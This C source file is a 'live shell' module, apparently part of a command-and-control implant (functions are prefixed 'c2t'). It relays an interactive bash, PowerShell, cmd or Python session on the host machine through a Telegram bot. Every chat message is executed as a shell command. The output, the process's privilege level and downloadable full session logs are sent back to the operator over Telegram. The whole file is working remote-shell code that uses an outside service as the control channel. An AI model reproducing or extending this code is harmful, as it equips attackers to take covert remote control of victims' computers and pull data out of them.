/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "shell_live.h"
#include "shell.h"
#include "../crypto/crypto.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"
#include "../telegram/telegram.h"

#include <ctype.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define LIVE_SCREEN_MAX_CHARS 1800U
#define LIVE_HISTORY_MAX_BYTES 65536U

static atomic_int s_live_active = 0;
static int64_t s_live_message_id = 0;
static char s_screen_buffer[3200] = {0};
static char s_full_history[LIVE_HISTORY_MAX_BYTES] = {0};
static size_t s_full_history_len = 0;
static char s_shell_title[64] = "Default OS Shell";

static const char s_live_keyboard_active[] =
    "{\"inline_keyboard\":[["
    "{\"text\":\"📥 Log\",\"callback_data\":\"sh_live_log\"},"
    "{\"text\":\"🧹 Clear\",\"callback_data\":\"sh_live_cls\"},"
    "{\"text\":\"🛑 Ctrl+C\",\"callback_data\":\"sh_live_ctrlc\"}"
    "],["
    "{\"text\":\"🔄 Refresh\",\"callback_data\":\"sh_live_refresh\"},"
    "{\"text\":\"🚪 Exit\",\"callback_data\":\"sh_live_exit\"}"
    "]]}";

static const char s_live_keyboard_closed[] =
    "{\"inline_keyboard\":[["
    "{\"text\":\"📥 Download Log\",\"callback_data\":\"sh_live_log\"},"
    "{\"text\":\"🟢 Re-open Shell\",\"callback_data\":\"sh_live_reopen\"}"
    "]]}";

static void strip_ansi_in_place(char *str) {
  if (!str)
    return;
  char *src = str;
  char *dst = str;
  while (*src) {
    if (*src == '\x1b' && src[1] == '[') {
      src += 2;
      while (*src && !isalpha((unsigned char)*src) && *src != 'm' &&
             *src != 'K' && *src != 'H' && *src != 'J' && *src != 'h' && *src != 'l') {
        src++;
      }
      if (*src)
        src++;
    } else if (*src == '\x1b' && src[1] == ']') {
      /* OSC sequences like \x1b]0;Title\x07 or \x1b]0;Title\x1b\ */
      src += 2;
      while (*src && *src != '\x07' && *src != '\x1b') {
        src++;
      }
      if (*src == '\x07') {
        src++;
      } else if (*src == '\x1b' && src[1] == '\\') {
        src += 2;
      }
    } else if (*src == '\x07' || *src == '\x08') {
      /* Skip bell and backspace characters */
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst = '\0';
}

static size_t escape_terminal_html(const char *src, char *dst, size_t dst_cap) {
  if (!src || !dst || dst_cap == 0)
    return 0;
  size_t d = 0;
  for (size_t s = 0; src[s] && d + 8 < dst_cap; s++) {
    unsigned char c = (unsigned char)src[s];
    if (c == '\r') {
      /* Normalize CRLF to LF: skip \r if followed by \n */
      if (src[s + 1] == '\n')
        continue;
      dst[d++] = '\n';
    } else if (c == '<') {
      memcpy(dst + d, "&lt;", 4);
      d += 4;
    } else if (c == '>') {
      memcpy(dst + d, "&gt;", 4);
      d += 4;
    } else if (c == '&') {
      memcpy(dst + d, "&amp;", 5);
      d += 5;
    } else if (c == '"') {
      memcpy(dst + d, "&quot;", 6);
      d += 6;
    } else if (c >= 32 || c == '\n' || c == '\t') {
      dst[d++] = (char)c;
    }
  }
  dst[d] = '\0';
  return d;
}

static void append_to_screen(const char *text) {
  if (!text || !*text)
    return;

  size_t add_len = strlen(text);
  if (s_full_history_len + add_len < sizeof(s_full_history) - 1) {
    memcpy(s_full_history + s_full_history_len, text, add_len);
    s_full_history_len += add_len;
    s_full_history[s_full_history_len] = '\0';
  }

  size_t cur_len = strlen(s_screen_buffer);
  if (cur_len + add_len < LIVE_SCREEN_MAX_CHARS) {
    memcpy(s_screen_buffer + cur_len, text, add_len);
    s_screen_buffer[cur_len + add_len] = '\0';
  } else {
    /* Keep rolling window: discard oldest lines and append newest */
    size_t overflow = (cur_len + add_len) - LIVE_SCREEN_MAX_CHARS + 300;
    const char *start_pos = s_screen_buffer + overflow;
    const char *nl = strchr(start_pos, '\n');
    if (nl && *(nl + 1)) {
      start_pos = nl + 1;
    }
    size_t keep_len = strlen(start_pos);
    memmove(s_screen_buffer, start_pos, keep_len);
    s_screen_buffer[keep_len] = '\0';

    size_t copy_now = add_len;
    if (keep_len + copy_now >= sizeof(s_screen_buffer) - 1) {
      copy_now = sizeof(s_screen_buffer) - 1 - keep_len;
    }
    memcpy(s_screen_buffer + keep_len, text, copy_now);
    s_screen_buffer[keep_len + copy_now] = '\0';
  }
}

static void render_live_message(char *out_html, size_t out_cap, int is_active) {
  if (!out_html || out_cap == 0)
    return;

  char esc_screen[2600] = {0};
  escape_terminal_html(s_screen_buffer, esc_screen, sizeof(esc_screen));

  c2t_shell_session_info_t info;
  int has_sess = c2t_shell_session_get_info(&info) && info.is_active;
  uint64_t pid = has_sess ? info.pid : 0;
  const char *priv = c2t_runtime_get_privilege_str();

  if (is_active) {
    snprintf(out_html, out_cap,
             "🟢 <b>Live Interactive Shell Console</b>\n"
             "• <b>Shell:</b> <code>%s</code> (PID: <code>%llu</code>)\n"
             "• <b>Privileges:</b> %s\n"
             "• <b>Status:</b> ⚡ <i>Live (all chat messages are sent directly to shell)</i>\n\n"
             "<pre><code class=\"language-text\">%s</code></pre>\n\n"
             "💡 <i>Type any command or <code>exit</code> / <code>/exit</code> to close.</i>",
             s_shell_title, (unsigned long long)pid, priv,
             esc_screen[0] ? esc_screen : "(Terminal session ready. Type a command...)");
  } else {
    snprintf(out_html, out_cap,
             "⚪ <b>Live Shell Console (Disconnected)</b>\n"
             "• <b>Shell:</b> <code>%s</code>\n"
             "• <b>Status:</b> ⏹️ <i>Session paused / closed</i>\n\n"
             "<pre><code class=\"language-text\">%s</code></pre>\n\n"
             "💡 <i>Use <code>/shell_live</code> or tap Re-open to start a live session.</i>",
             s_shell_title, esc_screen[0] ? esc_screen : "(No terminal output recorded)");
  }
  c2t_secure_zero(esc_screen, sizeof(esc_screen));
}

int c2t_shell_live_is_active(void) {
  return atomic_load(&s_live_active);
}

int c2t_shell_live_start(const char *shell_name) {
  c2t_shell_type_t st = C2T_SHELL_AUTO;
  if (shell_name && *shell_name) {
    while (isspace((unsigned char)*shell_name)) shell_name++;
#ifdef _WIN32
    if (_stricmp(shell_name, "bash") == 0) st = C2T_SHELL_BASH;
    else if (_stricmp(shell_name, "ps") == 0 || _stricmp(shell_name, "powershell") == 0 || _stricmp(shell_name, "pwsh") == 0) st = C2T_SHELL_POWERSHELL;
    else if (_stricmp(shell_name, "cmd") == 0) st = C2T_SHELL_CMD;
    else if (_stricmp(shell_name, "py") == 0 || _stricmp(shell_name, "python") == 0) st = C2T_SHELL_PYTHON;
#else
    if (strcasecmp(shell_name, "bash") == 0) st = C2T_SHELL_BASH;
    else if (strcasecmp(shell_name, "zsh") == 0) st = C2T_SHELL_ZSH;
    else if (strcasecmp(shell_name, "ps") == 0 || strcasecmp(shell_name, "powershell") == 0) st = C2T_SHELL_POWERSHELL;
    else if (strcasecmp(shell_name, "py") == 0 || strcasecmp(shell_name, "python") == 0) st = C2T_SHELL_PYTHON;
#endif
  }

  c2t_shell_session_info_t info;
  if (!c2t_shell_session_get_info(&info) || !info.is_active) {
    char start_msg[2048] = {0};
    if (!c2t_shell_session_start(st, start_msg, sizeof(start_msg))) {
      telegram_send_html("❌ <b>Failed to launch interactive shell session.</b>");
      return 0;
    }
  }

  if (c2t_shell_session_get_info(&info) && info.is_active) {
    snprintf(s_shell_title, sizeof(s_shell_title), "%s", info.shell_name);
  } else {
    snprintf(s_shell_title, sizeof(s_shell_title), "Default OS Shell");
  }

  atomic_store(&s_live_active, 1);

  if (s_screen_buffer[0] == '\0') {
    char banner[256];
    snprintf(banner, sizeof(banner), "=== Live %s Session Started [%s] ===\n",
             s_shell_title, c2t_runtime_get_privilege_str());
    append_to_screen(banner);

    /* Initial passive drain for shell prompt */
    c2t_shell_result_t init_res;
    memset(&init_res, 0, sizeof(init_res));
    if (c2t_shell_session_write("", 0, &init_res, 300) && init_res.output && *init_res.output) {
      strip_ansi_in_place(init_res.output);
      append_to_screen(init_res.output);
    }
    c2t_shell_result_free(&init_res);
  }

  char msg_html[4000] = {0};
  render_live_message(msg_html, sizeof(msg_html), 1);

  int64_t msg_id = 0;
  int ok = telegram_send_html_keyboard_get_id(msg_html, s_live_keyboard_active, &msg_id);
  if (ok && msg_id > 0) {
    s_live_message_id = msg_id;
  }

  (void)telegram_send_message_draft(209, "🟢 Live Shell Active: Send any command directly in chat...");
  return ok;
}

int c2t_shell_live_handle_input(const char *input_text) {
  if (!input_text || !c2t_shell_live_is_active())
    return 0;

  const char *p = input_text;
  while (*p && isspace((unsigned char)*p)) p++;
  if (!*p)
    return 1;

  /* Check for exit command */
  if (strcmp(p, "exit") == 0 || strcmp(p, "/exit") == 0 ||
      strcmp(p, "quit") == 0 || strcmp(p, "/quit") == 0 ||
      strcmp(p, "/sh_exit") == 0 || strcmp(p, "/live_exit") == 0 ||
      strcmp(p, "/sh_stop") == 0 || strcmp(p, "/shell_stop") == 0) {
    (void)c2t_shell_live_stop();
    telegram_send_html("🚪 <b>Live Shell Mode Exited</b>\n<i>Returning to normal bot command mode. Use <code>/shell_live</code> to re-enter.</i>");
    return 1;
  }

  /* Any Telegram bot command starting with '/' passes through to listener */
  if (*p == '/') {
    return 0;
  }

  /* Live draft notification */
  char draft[256];
  snprintf(draft, sizeof(draft), "⌨️ Executing: %s", p);
  (void)telegram_send_message_draft(209, draft);
  (void)telegram_send_chat_action("typing");

  /* Record command prompt */
  char prompt_line[300];
  snprintf(prompt_line, sizeof(prompt_line), "\n$ %s\n", p);
  append_to_screen(prompt_line);

  /* Send input into active shell session */
  c2t_shell_result_t res;
  memset(&res, 0, sizeof(res));
  int write_ok = c2t_shell_session_write(p, strlen(p), &res, 1200);

  if (write_ok && res.output && *res.output) {
    strip_ansi_in_place(res.output);
    append_to_screen(res.output);
  } else if (!write_ok) {
    append_to_screen("[Process exited or session closed]\n");
    atomic_store(&s_live_active, 0);
  }

  c2t_shell_result_free(&res);

  /* Live update the interactive terminal message in place */
  char msg_html[4000] = {0};
  render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());

  if (s_live_message_id > 0) {
    int edit_ok = telegram_edit_message_html(s_live_message_id, msg_html,
                                            c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    if (!edit_ok) {
      /* If message could not be edited, post new one and capture ID */
      int64_t new_id = 0;
      if (telegram_send_html_keyboard_get_id(msg_html, s_live_keyboard_active, &new_id) && new_id > 0) {
        s_live_message_id = new_id;
      }
    }
  } else {
    int64_t new_id = 0;
    if (telegram_send_html_keyboard_get_id(msg_html, s_live_keyboard_active, &new_id) && new_id > 0) {
      s_live_message_id = new_id;
    }
  }

  (void)telegram_clear_message_draft(209);
  return 1;
}

int c2t_shell_live_handle_callback(const char *callback_query_id,
                                   const char *callback_data) {
  if (!callback_data)
    return 0;

  if (strcmp(callback_data, "sh_live_log") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "📥 Generating full terminal log...");
    if (s_full_history_len > 0) {
      char filename[64];
      snprintf(filename, sizeof(filename), "terminal_session_%llu.log",
               (unsigned long long)time(nullptr));
      return telegram_send_file(s_full_history, s_full_history_len, "text/plain",
                                filename, nullptr);
    } else {
      return telegram_send_html("ℹ️ <i>No terminal output recorded yet.</i>");
    }
  }

  if (strcmp(callback_data, "sh_live_cls") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🧹 Screen cleared");
    s_screen_buffer[0] = '\0';
    char banner[128];
    snprintf(banner, sizeof(banner), "=== Terminal Cleared ===\n");
    append_to_screen(banner);

    char msg_html[4000] = {0};
    render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());
    if (s_live_message_id > 0) {
      (void)telegram_edit_message_html(s_live_message_id, msg_html,
                                      c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_ctrlc") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🛑 Ctrl+C sent (SIGINT)");
    append_to_screen("\n^C\n");
    c2t_shell_result_t res;
    memset(&res, 0, sizeof(res));
    static const char sigint_buf[] = "\x03\r\n";
    (void)c2t_shell_session_write(sigint_buf, sizeof(sigint_buf) - 1, &res, 600);
    if (res.output && *res.output) {
      strip_ansi_in_place(res.output);
      append_to_screen(res.output);
    }
    c2t_shell_result_free(&res);

    char msg_html[4000] = {0};
    render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());
    if (s_live_message_id > 0) {
      (void)telegram_edit_message_html(s_live_message_id, msg_html,
                                      c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_refresh") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🔄 Refreshed");
    c2t_shell_result_t res;
    memset(&res, 0, sizeof(res));
    (void)c2t_shell_session_write("", 0, &res, 400);
    if (res.output && *res.output) {
      strip_ansi_in_place(res.output);
      append_to_screen(res.output);
    }
    c2t_shell_result_free(&res);

    char msg_html[4000] = {0};
    render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());
    if (s_live_message_id > 0) {
      (void)telegram_edit_message_html(s_live_message_id, msg_html,
                                      c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_exit") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🚪 Exited live mode");
    (void)c2t_shell_live_stop();
    return 1;
  }

  if (strcmp(callback_data, "sh_live_reopen") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🟢 Re-opening live shell...");
    return c2t_shell_live_start(nullptr);
  }

  return 0;
}

int c2t_shell_live_stop(void) {
  atomic_store(&s_live_active, 0);

  char msg_html[4000] = {0};
  render_live_message(msg_html, sizeof(msg_html), 0);

  if (s_live_message_id > 0) {
    (void)telegram_edit_message_html(s_live_message_id, msg_html, s_live_keyboard_closed);
  }

  (void)telegram_clear_message_draft(209);
  return 1;
}

void c2t_shell_live_reset(void) {
  atomic_store(&s_live_active, 0);
  s_live_message_id = 0;
  c2t_secure_zero(s_screen_buffer, sizeof(s_screen_buffer));
  c2t_secure_zero(s_full_history, sizeof(s_full_history));
  s_full_history_len = 0;
  (void)telegram_clear_message_draft(209);
}
